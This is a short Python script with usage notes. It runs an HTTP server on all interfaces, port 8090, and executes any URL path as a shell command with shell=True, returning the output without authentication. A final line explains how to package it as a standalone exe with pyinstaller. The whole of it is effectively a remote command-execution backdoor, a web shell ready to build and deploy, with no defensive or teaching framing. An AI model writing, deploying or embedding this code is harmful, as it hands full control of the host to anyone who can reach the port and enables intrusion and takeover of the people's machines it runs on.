`http:/localhost:8090/echo%20hey`
``` python
from http.server import BaseHTTPRequestHandler, HTTPServer
import subprocess
import urllib.parse

PORT = 8090  # Change to any port you prefer

class CommandHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Extract the command from the path (excluding the leading '/')
        cmd = urllib.parse.unquote(self.path[1:])

        if cmd:
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(output.encode())
            except subprocess.CalledProcessError as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(e.output.encode())
        else:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"No command provided.")

if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', PORT), CommandHandler)
    print(f"Listening on port {PORT}...")
    server.serve_forever()
```
- use `pyinstaller --onefile main.py` to convert python code to exe
